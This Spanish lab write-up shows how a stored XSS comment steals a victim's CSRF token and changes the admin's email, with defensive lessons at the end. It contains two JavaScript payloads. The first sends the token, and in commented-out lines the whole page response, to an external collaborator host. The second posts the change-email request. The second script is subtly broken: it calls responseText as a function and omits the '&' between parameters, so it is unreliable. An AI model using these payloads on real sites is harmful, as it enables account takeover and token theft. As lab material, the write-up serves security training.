Nuestro objetivo es cambiar la dirección de correo electrónico del usuario afectado. Para ello, necesitamos primero obtener el token CSRF válido que protege dicha operación. Aprovechamos el XSS para hacer una petición al área de configuración de cuenta, capturar el contenido de la respuesta y extraer el token desde el HTML.

Una vez que tenemos el token, generamos una segunda petición desde el navegador de la víctima, enviando el token y la nueva dirección de correo. Como todo ocurre dentro de su propia sesión, la operación se realiza con éxito.

Este laboratorio demuestra cómo un XSS puede romper las defensas de tipo CSRF y subraya la importancia de que los tokens no solo estén presentes, sino que también estén correctamente aislados del acceso por parte de scripts inyectados.

En este caso, consolidamos la explotación automatizando todo el flujo: cuando una víctima visualiza el comentario malicioso, su navegador realiza una petición a su propia página de perfil, extrae el token CSRF del formulario oculto, y lo reutiliza inmediatamente para enviar una petición de cambio de correo electrónico sin que el usuario lo sepa.

Este enfoque permite realizar una acción sensible —como modificar información de cuenta— sin interacción directa por parte de la víctima, utilizando su sesión activa y su token legítimo.

La clase demuestra cómo XSS y CSRF pueden combinarse para romper la lógica de seguridad de muchas aplicaciones, y por qué es crucial implementar defensas adicionales como el uso de encabezados personalizados, políticas de contenido restrictivas (CSP), y el aislamiento del contenido generado por el usuario del contexto de ejecución del frontend.

------

Primeramente, debemos de ver la peticion que hace la funcionalidad de cammbio de contraseña, y se observa que se tiene un CSRF Token que viaja como parametro en la peticion

En el codigo fuente de la pagina, buscamos por CSRF y vemos que hay un campo oculto, con el valor del CSRF Token

Ahora, debemos obligar que el usuario nos envie su CSRF Token en una peticion por POST y con expresiones regulares podemos filtrar por ese valor del Token

Entonces creamos el Script

```javascript
<script>

    var req = new XMLHttpRequest();
    req.open('GET','/my-account',false); // Como el admin esta bajo el mismo dominio no es necesario
    req.send();

    var response = req.responseText;
    var csrf_token = response.match(/name="csrf" value="(.*?)"/)[1];
    
    var req2 = new XMLHttpRequest();
    //req2.open('GET','https://burpsuite-collaborator.net?response='+btoa(response));
    //req2.open('GET','https://burpsuite-collaborator.net?Token='+btoa(csrf_token));
    req2.open('GET','https://burpsuite-collaborator.net?Token='+csrf_token);
    req2.send();

</script>

```

Ahora desde el Collaborator, ya tendriamos la respuesta en base64 de la peticion anterior y obtener el CSRF Token para crear el nuevo script que nos va a permitir cambiarle el correo al usuario administrador

```javascript
<script>

    var req = new XMLHttpRequest();
    req.open('GET','/my-account',false); 
    req.send();

    var response = req.responseText();
    var csrf_token = response.match(/name="csrf" value="(.*?)"/)[1];
    
    var req2 = new XMLHttpRequest();
    req2.open('POST','/my-account/change-email',true);
    req2.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
    var data = "email="+encodeURIComponent("markos@markos.com")+"csrf="+encodeURIComponent(csrf_token); 
    req2.send(data);

</script>

```

